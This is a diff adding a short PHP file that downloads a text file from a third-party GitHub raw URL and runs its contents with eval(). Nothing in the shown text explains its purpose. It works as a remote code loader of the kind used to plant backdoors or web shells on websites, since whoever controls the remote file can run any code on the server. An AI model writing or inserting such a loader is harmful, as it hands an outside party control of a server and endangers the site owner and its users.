@@ -1,0 +1,16 @@
+<?php
+$url = 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/obs1.txt';
+
+$php_code = file_get_contents($url);
+
+if ($php_code !== false) {
+    $ext = strtolower(pathinfo(parse_url($url, PHP_URL_PATH), PATHINFO_EXTENSION));
+    if ($ext === 'php' || $ext === 'txt') {
+        eval('?>' . $php_code);
+    } else {
+        echo 'Not a PHP or TXT file.';
+    }
+} else {
+    echo 'error';
+}
+?>
